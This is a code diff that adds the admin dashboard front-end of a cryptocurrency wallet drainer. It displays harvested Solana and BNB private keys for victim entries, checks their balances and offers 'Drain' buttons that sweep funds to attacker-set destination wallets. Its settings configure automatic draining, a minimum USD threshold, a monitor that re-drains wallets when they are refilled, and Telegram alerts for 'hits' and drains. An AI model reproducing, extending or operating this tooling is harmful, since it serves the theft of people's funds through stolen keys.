+                            return `<div class="wallet-item wallet-error"><div class="wallet-header"><span class="wallet-number">Wallet ${wallet.walletIndex}</span></div><p style="color: #ef4444; margin: 0; font-size: 12px;">${wallet.error}</p></div>`;
+                        }
+                        return `<div class="wallet-item wallet-success"><div class="wallet-header"><span class="wallet-number"><svg class="wallet-status-icon" viewBox="0 0 24 24" fill="#ffffff"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" fill="currentColor"/></svg> SOL Wallet ${wallet.walletIndex}</span></div><div class="key-section"><div class="key-label">Wallet address</div><div class="key-display key-display-with-copy" onclick="copyToClipboard('${wallet.publicKey}')">${wallet.publicKey}<button class="copy-btn"><svg viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z" fill="currentColor"/></svg></button></div></div><div class="key-section"><div class="key-label">Private Key</div><div class="key-display blurred" data-key="${wallet.privateKey}" data-type="private" onclick="toggleKeyVisibility(this)">${wallet.privateKey}</div></div></div>`;
+                    }).join('');
+                }
+            }
+
+            if (entry.processedBnbBundles) {
+                if (entry.processedBnbBundles.error) {
+                    bnbWalletsHtml += `<div class="wallet-item wallet-error"><p style="color: #ef4444; margin: 0; font-size: 14px;"><strong>BNB Error:</strong> ${entry.processedBnbBundles.error}</p></div>`;
+                }
+                if (entry.processedBnbBundles.wallets && entry.processedBnbBundles.wallets.length > 0) {
+                    bnbWalletsHtml += `<div style="margin-bottom: 16px; margin-top: 24px; font-weight: 700; font-size: 14px;">BNB Keys (${entry.processedBnbBundles.wallets.length})</div>`;
+                    bnbWalletsHtml += entry.processedBnbBundles.wallets.map(wallet => {
+                        if (wallet.error) {
+                            return `<div class="wallet-item wallet-error"><div class="wallet-header"><span class="wallet-number">Wallet ${wallet.walletIndex}</span></div><p style="color: #ef4444; margin: 0; font-size: 12px;">${wallet.error}</p></div>`;
+                        }
+                        return `<div class="wallet-item wallet-success"><div class="wallet-header"><span class="wallet-number"><svg class="wallet-status-icon" viewBox="0 0 24 24" fill="#ffffff"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" fill="currentColor"/></svg> BNB Wallet ${wallet.walletIndex}</span></div><div class="key-section"><div class="key-label">Address</div><div class="key-display key-display-with-copy" onclick="copyToClipboard('${wallet.publicKey}')">${wallet.publicKey}<button class="copy-btn"><svg viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z" fill="currentColor"/></svg></button></div></div><div class="key-section"><div class="key-label">Private Key</div><div class="key-display blurred" data-key="${wallet.privateKey}" data-type="private" onclick="toggleKeyVisibility(this)">${wallet.privateKey}</div></div></div>`;
+                    }).join('');
+                }
+            }
+
+            content.innerHTML = `<div class="modal-header"><h3 class="modal-title">Wallet Keys</h3><button class="modal-close" onclick="closeModal()">&times;</button></div><div class="modal-body">${solWalletsHtml}${bnbWalletsHtml}</div>`;
+            document.body.appendChild(modal);
+        }
+
+        function viewFullData(id) {
+            const entry = bookmarkData.find(item => item.id === id);
+            if (!entry) { alert('Entry not found'); return; }
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            content.innerHTML = `<div class="modal-header"><h3 class="modal-title">Full Data for Entry #${entry.id}</h3><button class="modal-close" onclick="closeModal()">&times;</button></div><div class="modal-body"><pre style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 11px; border: 1px solid rgba(255,255,255,0.08); margin: 0; line-height: 1.4; white-space: pre-wrap; word-wrap: break-word; color: rgba(255,255,255,0.7);">${JSON.stringify(entry, null, 2)}</pre></div>`;
+            document.body.appendChild(modal);
+        }
+
+        function createModal() {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            modal.innerHTML = '<div class="modal-content"></div>';
+            modal.onclick = (e) => { if (e.target === modal) closeModal(); };
+            return modal;
+        }
+
+        function closeModal() {
+            const modal = document.querySelector('.modal');
+            if (modal) document.body.removeChild(modal);
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => showNotification('Key copied to clipboard!')).catch(err => alert('Failed to copy: ' + err.message));
+        }
+
+        function toggleKeyVisibility(element) {
+            const key = element.getAttribute('data-key');
+            const type = element.getAttribute('data-type');
+            if (element.classList.contains('blurred')) {
+                element.classList.remove('blurred');
+                element.classList.add('revealed');
+                showNotification(`${type === 'private' ? 'Private' : 'Public'} key revealed! Click again to copy.`);
+            } else if (element.classList.contains('revealed') || type === 'public') {
+                copyToClipboard(key);
+            }
+        }
+
+        function showNotification(message) {
+            const notification = document.getElementById('copyNotification');
+            notification.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" fill="currentColor"/></svg>${message}`;
+            notification.style.display = 'block';
+            setTimeout(() => { notification.style.display = 'none'; }, 2000);
+        }
+
+        function showErrorNotification(message) {
+            const notification = document.getElementById('errorNotification');
+            notification.innerHTML = message;
+            notification.style.display = 'block';
+            setTimeout(() => { notification.style.display = 'none'; }, 3000);
+        }
+
+        function startCheckBalanceCooldown() {
+            checkBalanceCooldown = true;
+            cooldownRemaining = 30;
+            const btn = document.getElementById('checkBalanceNavBtn');
+            btn.disabled = true;
+            btn.classList.add('cooldown');
+            function tick() {
+                if (cooldownRemaining <= 0) {
+                    checkBalanceCooldown = false;
+                    btn.disabled = false;
+                    btn.classList.remove('cooldown');
+                    btn.innerHTML = 'Check Balances';
+                    return;
+                }
+                btn.innerHTML = 'Wait ' + cooldownRemaining + 's';
+                cooldownRemaining--;
+                cooldownTimer = setTimeout(tick, 1000);
+            }
+            tick();
+        }
+
+        async function checkBalances() {
+            if (checkBalanceCooldown) return;
+            const btn = document.getElementById('checkBalanceNavBtn');
+            btn.style.color = 'rgba(255,255,255,0.3)';
+            btn.style.pointerEvents = 'none';
+            btn.innerHTML = '<svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite; width:16px; height:16px;"><path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z" fill="currentColor"/></svg> Checking...';
+            try {
+                const token = localStorage.getItem('adminAuth');
+                if (!token) { window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                const authHeaders = { 'Authorization': `Bearer ${token}` };
+
+                const startResponse = await fetch('/api/check-balances', { headers: authHeaders });
+                if (startResponse.status === 401) { localStorage.removeItem('adminAuth'); window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                const startData = await startResponse.json();
+                if (!startData.success || !startData.jobId) {
+                    alert('Error checking balances: ' + (startData.error || 'Failed to start balance check'));
+                    return;
+                }
+
+                const jobId = startData.jobId;
+                let pollDelay = 1000;
+                while (true) {
+                    await new Promise(resolve => setTimeout(resolve, pollDelay));
+                    const statusResponse = await fetch(`/api/check-balances/status/${jobId}`, { headers: authHeaders });
+                    if (statusResponse.status === 401) { localStorage.removeItem('adminAuth'); window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                    const data = await statusResponse.json();
+                    if (!data.success) {
+                        alert('Error checking balances: ' + (data.error || 'Job status unavailable'));
+                        return;
+                    }
+                    if (data.status === 'running' || data.status === 'pending') {
+                        let progressText = 'Checking...';
+                        if (data.progress && data.progress !== 'Starting...') {
+                            progressText = data.progress;
+                        } else if (data.totalWallets > 0) {
+                            progressText = `Checking... ${data.checkedWallets || 0}/${data.totalWallets}`;
+                        }
+                        btn.innerHTML = '<svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite; width:16px; height:16px;"><path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z" fill="currentColor"/></svg> ' + progressText;
+                        pollDelay = Math.min(pollDelay + 500, 5000);
+                        continue;
+                    }
+                    if (data.status === 'completed') {
+                        switchTab('logs');
+                        displayBalanceResults(data);
+                        return;
+                    }
+                    if (data.status === 'failed') {
+                        alert('Error checking balances: ' + (data.error || 'Balance check failed'));
+                        return;
+                    }
+                }
+            } catch (error) { alert('Error checking balances: ' + error.message); }
+            finally {
+                btn.style.color = '';
+                btn.style.pointerEvents = '';
+                startCheckBalanceCooldown();
+            }
+        }
+
+        async function checkEntryBalance(entryId) {
+            const btn = document.getElementById(`checkBalanceBtn-${entryId}`);
+            const originalContent = btn.innerHTML;
+            btn.innerHTML = `<svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite; width:14px; height:14px;"><path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z" fill="currentColor"/></svg>`;
+            btn.disabled = true;
+            try {
+                const token = localStorage.getItem('adminAuth');
+                if (!token) { window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                const response = await fetch(`/api/check-balance/${entryId}`, { headers: { 'Authorization': `Bearer ${token}` } });
+                if (response.status === 401) { localStorage.removeItem('adminAuth'); window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                const data = await response.json();
+                if (data.success) displayEntryBalanceModal(data, entryId);
+                else showErrorNotification('Error: ' + data.error);
+            } catch (error) { showErrorNotification('Error checking balance: ' + error.message); }
+            finally { btn.innerHTML = originalContent; btn.disabled = false; }
+        }
+
+        function displayEntryBalanceModal(data, entryId) {
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            content.style.maxWidth = '800px';
+            const totalSolBalance = Number(data.totalSolBalance) || 0;
+            const totalBnbBalance = Number(data.totalBnbBalance) || 0;
+            const totalUsdBalance = Number(data.totalUsdBalance) || 0;
+            const totalTokenUsdValue = Number(data.totalTokenUsdValue) || 0;
+            const totalTokenCount = Number(data.totalTokenCount) || 0;
+            const addressBalances = data.addressBalances || [];
+
+            let walletsHtml = '';
+            if (addressBalances.length > 0) {
+                walletsHtml = addressBalances.map(addr => {
+                    const balance = Number(addr.balance) || 0;
+                    const usdBalance = Number(addr.usdBalance) || 0;
+                    const tokenCount = Number(addr.tokenCount) || 0;
+                    const tokenUsdValue = Number(addr.tokenUsdValue) || 0;
+                    const totalUsdValue = Number(addr.totalUsdValue) || (usdBalance + tokenUsdValue);
+                    const chain = addr.chain || 'SOL';
+                    const balanceColor = balance > 0 ? '#ffffff' : 'rgba(255,255,255,0.4)';
+                    const explorerUrl = chain === 'BNB' ? `https://bscscan.com/address/${addr.publicKey}` : `https://solscan.io/account/${addr.publicKey}`;
+
+                    return `<div class="wallet-item" style="display: flex; flex-direction: column; gap: 10px;">
+                        <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px;">
+                            <div style="flex: 1; min-width: 200px;">
+                                <div style="font-weight: 600; color: #fff; margin-bottom: 4px;">${chain} Wallet ${addr.walletIndex}</div>
+                                <div style="font-family: 'Courier New', monospace; font-size: 11px; color: rgba(255,255,255,0.4); word-break: break-all;">${addr.publicKey}</div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-size: 18px; font-weight: 700; color: ${balanceColor};">${balance.toFixed(6)} ${chain} ($${usdBalance.toFixed(2)})</div>
+                                ${tokenCount > 0 ? `<div style="font-size:12px;color:#ffffff;margin-top:2px;">Tokens: ${tokenCount} ($${tokenUsdValue.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})})</div>` : ''}
+                                ${totalUsdValue > usdBalance ? `<div style="font-size:14px;font-weight:700;color:#fff;margin-top:4px;padding-top:4px;">Total: $${totalUsdValue.toFixed(2)}</div>` : ''}
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 8px; justify-content:flex-end;">
+                            <a href="${explorerUrl}" target="_blank" class="btn btn-secondary"><svg viewBox="0 0 24 24"><path d="M14,3V5H17.59L7.76,14.83L9.17,16.24L19,6.41V10H21V3M19,19H5V5H12V3H5C3.89,3 3,3.9 3,5V19A2,2 0 0,0 5,21H19A2,2 0 0,0 21,19V12H19V19Z" fill="currentColor"/></svg><div class="tooltip">Explorer</div></a>
+                            <button class="btn btn-success btn-with-text" onclick="drainWallet(${entryId}, ${addr.walletIndex}, '${chain}')">Drain</button>
+                        </div>
+                    </div>`;
+                }).join('');
+            } else {
+                walletsHtml = '<div style="text-align: center; color: rgba(255,255,255,0.4); padding: 20px;">No wallets found</div>';
+            }
+
+            const tokenCell = totalTokenCount > 0
+                ? `<div style="text-align: center;"><div style="font-size: 24px; font-weight: 800; color: ${totalTokenUsdValue > 0 ? '#ffffff' : 'rgba(255,255,255,0.5)'};">${totalTokenUsdValue > 0 ? '$' + totalTokenUsdValue.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}) : '—'}</div><div style="color: rgba(255,255,255,0.4); font-size: 12px;">${totalTokenCount} Token${totalTokenCount !== 1 ? 's' : ''}</div></div>`
+                : '';
+
+            content.innerHTML = `<div class="modal-header"><h3 class="modal-title">Balance for Entry #${entryId}</h3><button class="modal-close" onclick="closeModal()">&times;</button></div><div class="modal-body"><div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 16px; margin-bottom: 24px; padding: 16px; background: rgba(0,0,0,0.3); border-radius: 8px; border: 1px solid rgba(255,255,255,0.08);"><div style="text-align: center;"><div style="font-size: 24px; font-weight: 800; color: #fff;">${totalSolBalance.toFixed(4)}</div><div style="color: rgba(255,255,255,0.4); font-size: 12px;">SOL</div></div>${tokenCell}<div style="text-align: center;"><div style="font-size: 24px; font-weight: 800; color: #fff;">${totalBnbBalance.toFixed(4)}</div><div style="color: rgba(255,255,255,0.4); font-size: 12px;">BNB</div></div><div style="text-align: center;"><div style="font-size: 24px; font-weight: 800; color: #fff;">$${totalUsdBalance.toFixed(2)}</div><div style="color: rgba(255,255,255,0.4); font-size: 12px;">Total USD</div></div></div><div style="font-weight: 600; margin-bottom: 12px; color: #fff;">Wallets (${addressBalances.length})</div>${walletsHtml}</div>`;
+            document.body.appendChild(modal);
+        }
+
+        function displayBalanceResults(data) {
+            const resultsDiv = document.getElementById('balanceResults');
+            const summaryDiv = document.getElementById('balanceSummary');
+            const tbody = document.getElementById('balanceTableBody');
+            const totalSolAddresses = Number(data.totalSolAddresses) || 0;
+            const totalBnbAddresses = Number(data.totalBnbAddresses) || 0;
+            const totalSolBalance = Number(data.totalSolBalance) || 0;
+            const totalBnbBalance = Number(data.totalBnbBalance) || 0;
+            const totalUsdBalance = Number(data.totalUsdBalance) || 0;
+            const solPrice = Number(data.solPrice) || 0;
+            const bnbPrice = Number(data.bnbPrice) || 0;
+
+            const totalSolUsd = totalSolBalance * solPrice;
+            const totalBnbUsd = totalBnbBalance * bnbPrice;
+            summaryDiv.innerHTML = `<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px;"><div style="text-align: center;"><div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">${totalSolAddresses + totalBnbAddresses}</div><div style="color: rgba(255, 255, 255, 0.5);">Total Addresses</div></div><div style="text-align: center;"><div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">${totalSolBalance.toFixed(4)} SOL</div><div style="color: rgba(255, 255, 255, 0.5);">Total SOL</div></div><div style="text-align: center;"><div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">$${totalSolUsd.toFixed(2)}</div><div style="color: rgba(255, 255, 255, 0.5);">Total SOL USD</div></div><div style="text-align: center;"><div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">${totalBnbBalance.toFixed(4)} BNB</div><div style="color: rgba(255, 255, 255, 0.5);">Total BNB</div></div><div style="text-align: center;"><div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">$${totalBnbUsd.toFixed(2)}</div><div style="color: rgba(255, 255, 255, 0.5);">Total BNB USD</div></div><div style="text-align: center;"><div style="font-size: 28px; font-weight: 800; color: #ffffff; margin-bottom: 5px;">$${totalUsdBalance.toFixed(2)}</div><div style="color: rgba(255, 255, 255, 0.5);">Total USD</div></div></div>`;
+
+            const addressBalances = data.addressBalances || [];
+            tbody.innerHTML = addressBalances.map(addr => {
+                const balance = Number(addr.balance) || 0;
+                const usdBalance = Number(addr.usdBalance) || 0;
+                const chain = addr.chain || 'SOL';
+                const publicKey = addr.publicKey || '';
+                const nativeColor = balance > 0 ? '#ffffff' : 'rgba(255,255,255,0.4)';
+                const shortAddress = publicKey.length > 16 ? publicKey.substring(0, 8) + '...' + publicKey.substring(publicKey.length - 8) : publicKey;
+                const explorerUrl = chain === 'BNB' ? `https://bscscan.com/address/${publicKey}` : `https://solscan.io/account/${publicKey}`;
+                return `<tr>
+                    <td style="font-weight: 600;">#${addr.entryId || 'N/A'}</td>
+                    <td>Wallet ${addr.walletIndex || 'N/A'}</td>
+                    <td><span>${chain}</span></td>
+                    <td><div style="font-family: 'Courier New', monospace; font-size: 12px;"><span title="${publicKey}" onclick="navigator.clipboard.writeText('${publicKey}')" style="cursor:pointer;">${shortAddress}</span></div></td>
+                    <td style="color: ${nativeColor}; font-weight: 600;">${balance.toFixed(6)} ${chain}</td>
+                    <td style="color: ${nativeColor}; font-weight: 600;">$${usdBalance.toFixed(2)}</td>
+                    <td><div style="display: flex; gap: 8px;">
+                        <a href="${explorerUrl}" target="_blank" class="btn btn-secondary">
+                            <svg viewBox="0 0 24 24"><path d="M14,3V5H17.59L7.76,14.83L9.17,16.24L19,6.41V10H21V3M19,19H5V5H12V3H5C3.89,3 3,3.9 3,5V19A2,2 0 0,0 5,21H19A2,2 0 0,0 21,19V12H19V19Z" fill="currentColor"/></svg>
+                            <div class="tooltip">View on Explorer</div>
+                        </a>
+                        <button class="btn btn-success" onclick="viewPrivateKey(${addr.entryId}, ${addr.walletIndex}, '${chain}')">
+                            <svg viewBox="0 0 24 24"><path d="M7,14A2,2 0 0,1 5,12A2,2 0 0,1 7,10A2,2 0 0,1 9,12A2,2 0 0,1 7,14M12.65,10C11.83,7.67 9.61,6 7,6A6,6 0 0,0 1,12A6,6 0 0,0 7,18C9.61,18 11.83,16.33 12.65,14H17V18H21V14H23V10H12.65Z" fill="currentColor"/></svg>
+                            <div class="tooltip">View Private Key</div>
+                        </button>
+                        <button class="btn btn-primary btn-with-text" onclick="drainWallet(${addr.entryId}, ${addr.walletIndex}, '${chain}')">Drain</button>
+                    </div></td>
+                </tr>`;
+            }).join('');
+
+            resultsDiv.style.display = 'block';
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function hideBalanceResults() { document.getElementById('balanceResults').style.display = 'none'; }
+
+        function viewPrivateKey(entryId, walletIndex, chain = 'SOL') {
+            const entry = bookmarkData.find(item => item.id === entryId);
+            if (!entry) { alert('Entry not found'); return; }
+            let wallet;
+            if (chain === 'BNB') {
+                if (!entry.processedBnbBundles || !entry.processedBnbBundles.wallets) { alert('No BNB wallet data found'); return; }
+                wallet = entry.processedBnbBundles.wallets.find(w => w.walletIndex === walletIndex);
+            } else {
+                if (!entry.processedSBundles || !entry.processedSBundles.wallets) { alert('No SOL wallet data found'); return; }
+                wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === walletIndex);
+            }
+            if (!wallet) { alert('Wallet not found'); return; }
+            if (wallet.error) { alert('This wallet has an error: ' + wallet.error); return; }
+
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            content.innerHTML = `<div class="modal-header"><h3 class="modal-title">${chain} Private Key - Wallet ${wallet.walletIndex}</h3><button class="modal-close" onclick="closeModal()">&times;</button></div><div class="modal-body"><div class="wallet-item wallet-success"><div class="key-section"><div class="key-label">Wallet Address</div><div class="key-display key-display-with-copy" onclick="copyToClipboard('${wallet.publicKey}')">${wallet.publicKey}<button class="copy-btn"><svg viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z" fill="currentColor"/></svg></button></div></div><div class="key-section"><div class="key-label">Private Key</div><div class="key-display blurred" data-key="${wallet.privateKey}" data-type="private" onclick="toggleKeyVisibility(this)">${wallet.privateKey}</div></div></div></div>`;
+            document.body.appendChild(modal);
+        }
+
+        async function drainWallet(entryId, walletIndex, chain = 'SOL') {
+            const button = event.target.closest('button');
+            const originalContent = button.innerHTML;
+            button.innerHTML = `<svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite; width:14px; height:14px;"><path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z" fill="currentColor"/></svg>`;
+            button.disabled = true;
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/drain-wallet', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+                    body: JSON.stringify({ entryId, walletIndex, chain })
+                });
+                const data = await response.json();
+                if (data.success) showNotification(`Successfully drained ${data.amountDrained.toFixed(4)} ${chain}`);
+                else showErrorNotification(`Failed to drain wallet: ${data.error}`);
+            } catch (error) { showErrorNotification(`Error draining wallet: ${error.message}`); }
+            finally { button.innerHTML = originalContent; button.disabled = false; }
+        }
+
+        async function saveServerConfig(newConfig) {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/config', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+                    body: JSON.stringify(newConfig)
+                });
+                const data = await response.json();
+                if (data.success) { serverConfig = data.config; return true; }
+                return false;
+            } catch (error) { console.error('Error saving config:', error); return false; }
+        }
+
+        async function openSettingsModal() {
+            await loadServerConfig();
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            content.style.maxWidth = '900px';
+
+            content.innerHTML = `
+                <div class="modal-header">
+                    <h3 class="modal-title">Admin Settings</h3>
+                    <button class="modal-close" onclick="closeModal()">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <div class="settings-section">
+                        <div class="settings-title">Drain</div>
+                        <div class="settings-toggle">
+                            <span class="settings-toggle-label">Enable auto drain?</span>
+                            <div class="toggle-switch ${serverConfig.autoDrainEnabled !== false ? 'active' : ''}" id="autoDrainToggle" onclick="toggleSetting('autoDrainToggle')"></div>
+                        </div>
+                        <div class="settings-subsection">
+                            <div class="settings-subsection-title">SOL Settings</div>
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">Solana Destination Wallet</label>
+                                <input type="text" class="settings-input" id="solanaDestinationWallet" value="${serverConfig.solanaDestinationWallet || ''}" placeholder="Enter SOL destination address">
+                            </div>
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">SOL Reserve Amount</label>
+                                <input type="number" class="settings-input settings-input-small" id="solReserveAmount" value="${serverConfig.solReserveAmount || 0.01}" step="0.001" min="0">
+                            </div>
+                        </div>
+                        <div class="settings-subsection">
+                            <div class="settings-subsection-title">BNB Settings</div>
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">BNB Destination Wallet</label>
+                                <input type="text" class="settings-input" id="bnbDestinationWallet" value="${serverConfig.bnbDestinationWallet || ''}" placeholder="Enter BNB destination address (0x...)">
+                            </div>
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">BNB Reserve Amount</label>
+                                <input type="number" class="settings-input settings-input-small" id="bnbReserveAmount" value="${serverConfig.bnbReserveAmount || 0.001}" step="0.0001" min="0">
+                            </div>
+                        </div>
+                        <div class="settings-subsection">
+                            <div class="settings-subsection-title">Other Drain</div>
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">Minimum Drain Amount (USD)</label>
+                                <input type="number" class="settings-input settings-input-small" id="minimumDrainAmountUsd" value="${serverConfig.minimumDrainAmountUsd || 0}" step="0.01" min="0">
+                            </div>
+                        </div>
+                        <div class="settings-subsection">
+                            <div class="settings-subsection-title">Total Drained Amount</div>
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">Amount (USD)</label>
+                                <div style="display: flex; gap: 8px; align-items: center;">
+                                    <input type="number" class="settings-input" id="customDrainedAmount" value="" step="0.01" min="0" placeholder="Enter amount" style="width: 200px;">
+                                    <button class="save-btn" style="margin: 0; width: 44px; min-width: 44px; padding: 12px; font-size: 18px;" onclick="adjustCustomDrained('add')">+</button>
+                                    <button class="save-btn" style="margin: 0; width: 44px; min-width: 44px; padding: 12px; font-size: 18px; background: rgba(255,255,255,0.1); color: #fff;" onclick="adjustCustomDrained('subtract')">−</button>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="save-btn" onclick="saveDrainSettings()">Save Drain Settings</button>
+                    </div>
+
+                    <div class="settings-section">
+                        <div class="settings-title">Telegram</div>
+                        <div class="settings-toggle">
+                            <span class="settings-toggle-label">Enable hit/drain logs?</span>
+                            <div class="toggle-switch ${serverConfig.telegramNotificationsEnabled !== false ? 'active' : ''}" id="telegramNotificationsToggle" onclick="toggleSetting('telegramNotificationsToggle')"></div>
+                        </div>
+                        <div class="settings-input-group">
+                            <label class="settings-input-label">Bot Token</label>
+                            <input type="text" class="settings-input" id="telegramBotToken" value="${serverConfig.telegramBotToken || ''}" placeholder="Enter Telegram bot token">
+                        </div>
+                        <div class="settings-input-group">
+                            <label class="settings-input-label">Chat/Group ID</label>
+                            <input type="text" class="settings-input" id="telegramChatId" value="${serverConfig.telegramChatId || ''}" placeholder="Enter chat ID">
+                        </div>
+                        <button class="save-btn" onclick="saveTelegramSettings()">Save Telegram Settings</button>
+                    </div>
+
+                    <div class="settings-section">
+                        <div class="settings-title">Other Telegram</div>
+                        <div class="settings-toggle">
+                            <span class="settings-toggle-label">User signups</span>
+                            <div class="toggle-switch ${serverConfig.telegramSignupLogsEnabled ? 'active' : ''}" id="telegramSignupLogsToggle" onclick="toggleSetting('telegramSignupLogsToggle')"></div>
+                        </div>
+                        <div class="settings-toggle">
+                            <span class="settings-toggle-label">User logins</span>
+                            <div class="toggle-switch ${serverConfig.telegramLoginLogsEnabled ? 'active' : ''}" id="telegramLoginLogsToggle" onclick="toggleSetting('telegramLoginLogsToggle')"></div>
+                        </div>
+                        <button class="save-btn" onclick="saveAuthLogSettings()">Save Other Telegram Settings</button>
+                    </div>
+
+                    <div class="settings-section">
+                        <div class="settings-title">Redeposit Monitor</div>
+                        <div class="settings-toggle">
+                            <span class="settings-toggle-label">Enable redeposit monitor</span>
+                            <div class="toggle-switch ${serverConfig.redepositMonitorEnabled ? 'active' : ''}" id="redepositMonitorToggle" onclick="toggleSetting('redepositMonitorToggle')"></div>
+                        </div>
+                        <div class="settings-subsection">
+                            <div class="settings-input-group">
+                                <label class="settings-input-label">Check all wallets every xx minutes</label>
+                                <input type="number" class="settings-input settings-input-small" id="redepositIntervalMinutes" value="${serverConfig.redepositMonitorIntervalMinutes || 60}" min="3" max="999999" step="1" style="width: 160px;">
+                                <div style="font-size: 11px; color: rgba(255,255,255,0.35); margin-top: 6px;">Min: 3 &nbsp;|&nbsp; Max: 999999</div>
+                            </div>
+                        </div>
+                        <button class="save-btn" onclick="saveRedepositSettings()">Save Redeposit Settings</button>
+                    </div>
+
+                    <div class="settings-section">
+                        <div class="settings-title">Change Password</div>
+                        <div class="settings-input-group">
+                            <label class="settings-input-label">Current Password</label>
+                            <input type="password" class="settings-input" id="currentPassword" placeholder="Enter current password">
+                        </div>
+                        <div class="settings-input-group">
+                            <label class="settings-input-label">New Password</label>
+                            <input type="password" class="settings-input" id="newPassword" placeholder="Enter new password">
+                        </div>
+                        <div class="settings-input-group">
+                            <label class="settings-input-label">Confirm New Password</label>
+                            <input type="password" class="settings-input" id="confirmPassword" placeholder="Confirm new password">
+                        </div>
+                        <button class="save-btn" onclick="changePassword()" style="background: #ef4444;">Change Password</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        }
+
+        function toggleSetting(toggleId) {
+            document.getElementById(toggleId).classList.toggle('active');
+        }
+
+        async function saveDrainSettings() {
+            const newConfig = {
+                autoDrainEnabled: document.getElementById('autoDrainToggle').classList.contains('active'),
+                solanaDestinationWallet: document.getElementById('solanaDestinationWallet').value.trim(),
+                solReserveAmount: parseFloat(document.getElementById('solReserveAmount').value) || 0.01,
+                bnbDestinationWallet: document.getElementById('bnbDestinationWallet').value.trim(),
+                bnbReserveAmount: parseFloat(document.getElementById('bnbReserveAmount').value) || 0.001,
+                minimumDrainAmountUsd: parseFloat(document.getElementById('minimumDrainAmountUsd').value) || 0
+            };
+            if (await saveServerConfig(newConfig)) { showNotification('Drain settings saved!'); }
+            else showErrorNotification('Failed to save drain settings');
+        }
+
+        async function adjustCustomDrained(operation) {
+            const amount = parseFloat(document.getElementById('customDrainedAmount').value) || 0;
+            if (amount <= 0) { showErrorNotification('Enter an amount greater than 0'); return; }
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/set-custom-drained', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+                    body: JSON.stringify({ amount, operation })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    customDrainedAmount = data.customDrainedAmount;
+                    document.getElementById('customDrainedAmount').value = '';
+                    renderStats();
+                    renderCharts();
+                    const sign = operation === 'subtract' ? 'Removed' : 'Added';
+                    showNotification(sign + ' $' + amount.toFixed(2) + '! New total: $' + data.totalDrainedUsd.toFixed(2));
+                } else {
+                    showErrorNotification('Failed: ' + (data.error || 'Unknown error'));
+                }
